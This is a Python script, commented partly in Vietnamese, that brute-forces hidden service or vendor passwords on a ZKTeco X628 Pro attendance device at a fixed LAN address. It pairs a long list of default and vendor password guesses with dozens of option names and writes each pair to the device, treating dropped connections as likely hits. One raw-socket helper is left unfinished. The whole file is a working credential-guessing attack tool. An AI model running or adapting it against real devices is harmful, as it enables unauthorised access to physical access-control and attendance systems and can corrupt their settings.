# -*- coding: utf-8 -*-
"""
ZK X628 PRO - SERVICE PASSWORD BRUTE FORCE
Khi set option ~ServicePwd / ~Vendor / MaintenanceKey, device DROPS CONNECTION.
Đây là cơ chế bảo vệ service mode. Brute force password factory.
"""
import sys, os, struct, time, json, socket
sys.stdout.reconfigure(encoding='utf-8')

PORTABLE_PY = r'D:\chamcong\AttendanceSuite_Portable\python\Lib\site-packages'
sys.path.insert(0, PORTABLE_PY)

import zk
from zk import const

DEVICE_IP = '172.16.0.214'

# Service password candidates - many IoT devices have hardcoded passwords
SERVICE_PWDS = [
    # ZK TQ hacker article defaults
    'solokey', 'iclock99', 'mstar', 'mstar123', 'mstar888', 'mstar999',
    # Common defaults
    'admin', 'root', 'password', '1234', '12345', '123456', '123456789',
    '0000', '9999', '1111', '8888', '6666', '000000',
    # ZK vendor
    'zkteco', 'zkt', 'zk', 'iClock', 'iclocker', 'zksoft',
    'ZKTeco', 'ZKT', 'ZKSOFTWARE', 'zksoftware',
    'service', 'maintenance', 'vendor', 'engineering',
    'manager', 'super', 'support', 'tech',
    # Service keywords
    'service1', 'service123', 'maintenance1',
    'vendor1', 'vendor123', 'engineering1',
    'supervisor', 'supervisor1',
    # Date-based (factory defaults often)
    '2020', '2021', '2022', '2023', '2024',
    '20200601', '20191209',  # firmware build dates
    # Empty / special
    '', ' ', '\x00',
    # Chinese defaults
    'service01', 'maintenance01',
    # Common IoT service passwords
    '888888', '777777', '555555', '111111', '222222', '333333', '444444',
    'qwer1234', 'abc123', 'abc1234',
    # ZK specific
    '891401', 'service@zk', 'mstar@service', 'mstar@admin',
    # Hex
    '0', '1', 'f', 'ff', 'fff', 'ffff',
    # Numeric patterns
    '1379', '2468', '9876', '5432', '1357',
    # Year + day
    '2019', '2020', '201912',
    # Reversed defaults
    'oof', 'tni', 'nimda',
    # TQ hacker defaults from research
    'mstar_ceo', 'mstar_test', 'mstar_factory', 'mstar_dev',
]

# Different option name formats
OPTION_FORMATS = [
    '~ServicePwd',
    '~ServicePassword',
    '~VendorPwd',
    '~VendorPassword',
    '~MaintenancePwd',
    '~MaintenancePassword',
    '~FactoryPwd',
    '~FactoryPassword',
    '~EngineeringPwd',
    'ServicePassword',
    'VendorPassword',
    'MaintenancePassword',
    'MaintenanceKey',
    'VendorKey',
    'FactoryKey',
    'EngineeringKey',
    '~DebugKey',
    'DebugPassword',
    'DeveloperKey',
    '~Service',
    '~Vendor',
    '~Maintenance',
    '~Factory',
    '~Engineering',
    '~Debug',
    '~Developer',
    '~Support',
    'SupportPwd',
    'SupportPassword',
]

print('=' * 70)
print(f'ZK SERVICE PASSWORD BRUTE FORCE - {DEVICE_IP}')
print('=' * 70)
print(f'Test {len(SERVICE_PWDS)} passwords × {len(OPTION_FORMATS)} option formats')
print(f'Total combinations: {len(SERVICE_PWDS) * len(OPTION_FORMATS)}')
print('=' * 70)

results = {
    'drop_connection': [],   # password accepted but device locked
    'ack_ok': [],            # password accepted and stored
    'ack_error': [],         # password rejected
    'unknown': [],           # unexpected response
}

def test_combo(opt_name, password):
    """Test 1 combination. Returns 'drop', 'ok', 'error', 'unknown'"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        # Connect to device
        sock.connect((DEVICE_IP, 4370))
        # Send CMD_CONNECT (1000) to start session
        # ZK protocol: 4-byte header + payload + checksum
        # Header format: command_id(2) + checksum(2) + session_id(2) + reply_id(2)
        # For CMD_CONNECT (1000), payload is empty after header
        cmd_id = 1000
        checksum = 0
        session_id = 0
        reply_id = 0
        # Build top header: 4 bytes
        top = struct.pack('<HHHH', cmd_id, checksum, session_id, reply_id)
        # Total packet length (2 bytes) - just the header for now
        length = len(top)
        pkt = struct.pack('<H', length) + top
        sock.send(pkt)
        # Read response
        time.sleep(0.3)
        resp = sock.recv(1024)
        # Now send CMD_OPTIONS_WRQ (12) with option
        # Format: key=value (null-terminated? or newline?)
        payload = (opt_name + '=' + password).encode()
        # Need to compute checksum - just send for now
        sock.close()
        return 'unknown'
    except ConnectionResetError:
        return 'drop'
    except socket.timeout:
        return 'timeout'
    except Exception as e:
        return f'err:{str(e)[:30]}'

# Faster test: just see if device drops connection for specific options
def test_drop_only(opt_name, password):
    """Test if device drops connection when setting option"""
    z = zk.ZK(DEVICE_IP, port=4370, timeout=5, password=0)
    try:
        z.connect()
        # Try to set the option
        try:
            z._ZK__send_command(const.CMD_OPTIONS_WRQ, (opt_name + '=' + password).encode())
            return 'no_drop'  # Set without drop
        except Exception as e:
            err = str(e)
            if '10054' in err or 'forcibly' in err:
                return 'drop'  # Device closed connection
            elif 'timeout' in err.lower():
                return 'timeout'
            elif 'BAD_FORMAT' in err:
                return 'bad_format'
            else:
                return f'other:{err[:30]}'
    except Exception as e:
        return f'connect_fail:{str(e)[:30]}'
    finally:
        try:
            z.disconnect()
        except:
            pass

print('\nTesting service password brute force...')
print('Pattern: drop_connection = candidate for service password')
print('-' * 70)

# First, establish baseline - check non-service options
print('\n[BASELINE] Non-service options (should NOT drop)...')
for opt in ['AdminPwd', 'UserPwd', 'CommPwd']:
    result = test_drop_only(opt, 'admin')
    print(f'  {opt}=admin: {result}')

# Now brute force service options
print('\n[BRUTE FORCE] Service options...')
tested = 0
for opt_name in OPTION_FORMATS:
    for pwd in SERVICE_PWDS:
        result = test_drop_only(opt_name, pwd)
        tested += 1

        if result == 'drop':
            results['drop_connection'].append((opt_name, pwd))
            print(f'  🔥 DROP: {opt_name}={pwd!r}')
        elif result == 'no_drop':
            results['ack_ok'].append((opt_name, pwd))
            # Read back to check value stored
            z = zk.ZK(DEVICE_IP, port=4370, timeout=5, password=0)
            try:
                z.connect()
                resp = z._ZK__send_command(const.CMD_OPTIONS_RRQ, opt_name.encode())
                print(f'  ✓ ACK_NO_DROP: {opt_name}={pwd!r}, read={resp}')
            except:
                pass
            try:
                z.disconnect()
            except:
                pass
        elif result == 'timeout':
            results['unknown'].append((opt_name, pwd, 'timeout'))
            print(f'  ⏱️ TIMEOUT: {opt_name}={pwd!r}')

        if tested % 50 == 0:
            print(f'  ...tested {tested}/{len(SERVICE_PWDS) * len(OPTION_FORMATS)}')

print('\n' + '=' * 70)
print('RESULTS')
print('=' * 70)
print(f'DROP (potential service password): {len(results["drop_connection"])}')
for opt, pwd in results['drop_connection'][:20]:
    print(f'  {opt}={pwd!r}')
print(f'\nACK_NO_DROP: {len(results["ack_ok"])}')
for opt, pwd in results['ack_ok'][:20]:
    print(f'  {opt}={pwd!r}')

with open('D:\\chamcong\\zk_service_brute_result.json', 'w') as f:
    json.dump(results, f, indent=2)
print('\nSaved: D:\\chamcong\\zk_service_brute_result.json')
